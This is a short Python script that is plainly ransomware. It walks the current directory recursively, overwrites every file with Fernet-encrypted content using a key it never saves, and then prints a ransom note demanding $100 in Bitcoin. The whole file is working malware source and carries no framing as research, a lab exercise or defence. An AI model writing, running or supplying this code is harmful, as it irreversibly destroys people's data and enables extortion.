import os
from cryptography.fernet import Fernet

# Generate a key for encryption
key = Fernet.generate_key()
cipher = Fernet(key)

# Function to encrypt a file
def encrypt_file(file_path):
    with open(file_path, 'rb') as file:
        data = file.read()
    encrypted_data = cipher.encrypt(data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

# Encrypt all files in the current directory
for root, _, files in os.walk('.'):
    for file in files:
        encrypt_file(os.path.join(root, file))

# Display ransom note
print("Your files have been encrypted. To decrypt them, send $100 worth of Bitcoin to this address...")
